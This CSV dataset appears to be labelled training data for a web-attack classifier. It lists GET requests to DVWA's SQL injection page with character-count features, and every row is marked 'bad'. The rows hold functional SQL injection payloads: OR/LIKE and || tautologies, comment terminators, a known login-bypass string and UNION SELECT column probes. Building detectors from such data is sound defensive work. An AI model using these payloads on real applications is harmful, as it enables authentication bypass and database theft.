Method,Path,Body,Single Quotes,Double Quotes,Dashes,Braces,Spaces,Tags,Colons,Backtick,Bad Words,XSS Check,XSS Word,Class
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%282%29LiKE%282%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,2,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%282%29LiKE%282%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,2,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%282%29LiKE%282%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,2,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%282%29LiKE%282%29oR%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,2,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%222%22LiKE%222&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%222%22LiKE%222%22--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%222%22LiKE%222%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%222%22LiKE%222%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%222%22LiKE%222%22oR%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,6,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%282%29LiKE%282%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,2,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%282%29LiKE%282%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,2,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%282%29LiKE%282%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,2,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%282%29LiKE%282%29oR%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,2,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%22--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=ffifdyop&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20UniON%20SElecT%201%2C2--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,4,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20UniON%20SElecT%201%2C2%2C3--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,4,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20UniON%20SElecT%201%2C2%2C3%2C4--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,4,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20UniON%20SElecT%201%2C2%2C3%2C4%2C5--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,4,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20UniON%20SElecT%201%2C2%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,3,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20UniON%20SElecT%201%2C2%2C3%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,3,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20UniON%20SElecT%201%2C2%2C3%2C4%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,3,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20UniON%20SElecT%201%2C2%2C3%2C4%2C5%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,3,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27UniON%28SElecT%281%29%2C2%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,2,1,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27UniON%28SElecT%281%29%2C2%2C3%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,2,1,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27UniON%28SElecT%281%29%2C2%2C3%2C4%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,2,1,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27UniON%28SElecT%281%29%2C2%2C3%2C4%2C5%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,2,1,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27UniON%28SElecT%281%29%2C2%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,2,0,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27UniON%28SElecT%281%29%2C2%2C3%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,2,0,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27UniON%28SElecT%281%29%2C2%2C3%2C4%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,2,0,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27UniON%28SElecT%281%29%2C2%2C3%2C4%2C5%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,2,0,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20UniON%20SElecT%201%2C2--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,4,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20UniON%20SElecT%201%2C2%2C3--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,4,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20UniON%20SElecT%201%2C2%2C3%2C4--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,4,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20UniON%20SElecT%201%2C2%2C3%2C4%2C5--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,4,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20UniON%20SElecT%201%2C2%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,3,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20UniON%20SElecT%201%2C2%2C3%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,3,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20UniON%20SElecT%201%2C2%2C3%2C4%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,3,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20UniON%20SElecT%201%2C2%2C3%2C4%2C5%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,3,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22UniON%28SElecT%281%29%2C2%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,2,1,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22UniON%28SElecT%281%29%2C2%2C3%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,2,1,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22UniON%28SElecT%281%29%2C2%2C3%2C4%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,2,1,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22UniON%28SElecT%281%29%2C2%2C3%2C4%2C5%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,2,1,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22UniON%28SElecT%281%29%2C2%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,2,0,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22UniON%28SElecT%281%29%2C2%2C3%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,2,0,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22UniON%28SElecT%281%29%2C2%2C3%2C4%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,2,0,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22UniON%28SElecT%281%29%2C2%2C3%2C4%2C5%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,2,0,0,0,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7C%272&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7C2--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7C%272%27%7C%7C%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7C2%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7C2%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7C2%7C%7C%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%7C%7C%222&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%7C%7C2--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%7C%7C%222%22%7C%7C%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%7C%7C2%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%7C%7C2%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%7C%7C2%7C%7C%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7C%272%27%3D%272&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7C%272%27%3D%272%27%7C%7C%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,6,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7C2%3D2--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7C2%3D2%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7C2%3D2%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7C2%3D2%7C%7C%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%7C%7C%222%22%3D%222&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%7C%7C%222%22%3D%222%22%7C%7C%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,6,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%7C%7C2%3D2--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%7C%7C2%3D2%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%7C%7C2%3D2%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%7C%7C2%3D2%7C%7C%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7C2%3D%282%29LimIT%281%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,2,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7C2%3D%282%29LimIT%281%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,2,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7C2%3D%282%29LimIT%281%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,2,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%7C%7C2%3D%282%29LimIT%281%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,2,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%7C%7C2%3D%282%29LimIT%281%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,2,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%7C%7C2%3D%282%29LimIT%281%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,2,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7Ctrue--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7Ctrue%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7Ctrue%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7Ctrue%7C%7C%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%7C%7Ctrue--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%7C%7Ctrue%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%7C%7Ctrue%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%7C%7Ctrue%7C%7C%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7C%272%27LiKE%272&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7C%272%27LiKE%272%27--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7C%272%27LiKE%272%27%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7C%272%27LiKE%272%27%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7C%272%27LiKE%272%27%7C%7C%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,6,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7C%282%29LiKE%282%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,2,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7C%282%29LiKE%282%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,2,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7C%282%29LiKE%282%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,2,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7C%282%29LiKE%282%29%7C%7C%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,2,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%7C%7C%222%22LiKE%222&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%7C%7C%222%22LiKE%222%22--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%7C%7C%222%22LiKE%222%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%7C%7C%222%22LiKE%222%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%7C%7C%222%22LiKE%222%22%7C%7C%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,6,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%7C%7C%282%29LiKE%282%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,2,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%7C%7C%282%29LiKE%282%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,2,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%7C%7C%282%29LiKE%282%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,2,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%7C%7C%282%29LiKE%282%29%7C%7C%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,2,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%28%272&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,1,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%272%27--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,3,0,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%272%27%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,3,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%272%27%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,3,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%272%27oR%28%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,1,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%282%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,1,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%282%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,1,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%282%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,1,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%282%29oR%28%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,2,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%202--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%202%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%202%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%202%20oR%28%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,1,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%2f%2A%2A%2f2--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%2f%2A%2A%2f2%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%2f%2A%2A%2f2%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%2f%2A%2A%2f2%2f%2A%2A%2foR%28%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,1,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%28%222&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,1,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%222%22--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%222%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%222%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%222%22oR%28%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,1,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%282%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,1,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%282%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,1,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%282%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,1,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%282%29oR%28%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,2,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%202--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%202%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%202%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,1,0,0,0,1,0,0,bad
